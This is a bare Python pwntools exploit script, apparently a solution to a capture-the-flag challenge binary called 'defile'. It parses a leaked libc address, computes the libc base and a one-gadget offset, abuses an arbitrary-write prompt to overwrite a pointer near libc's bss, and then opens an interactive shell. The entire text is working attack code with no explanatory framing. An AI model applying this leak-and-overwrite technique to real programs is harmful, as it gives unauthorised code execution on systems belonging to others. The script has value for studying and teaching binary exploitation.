from pwn import *
io=process("./defile")
io.recvuntil("Here's stdout:\n")
leak=int(io.recv(14),16)
libc_bss=leak-0x1760
libc_base=leak-0x1e5760
print hex(leak)
io.recvuntil("How much do you want to write?")
io.sendline("250")
io.recvuntil("Where do you want to write?\n")
io.send(str(libc_bss+168))
one_gad=libc_base+0x106ef8
system=leak-0x39d320
#gdb.attach(io)
io.recvuntil("What do you want to write?\n")
io.send(p64(one_gad))
io.interactive()
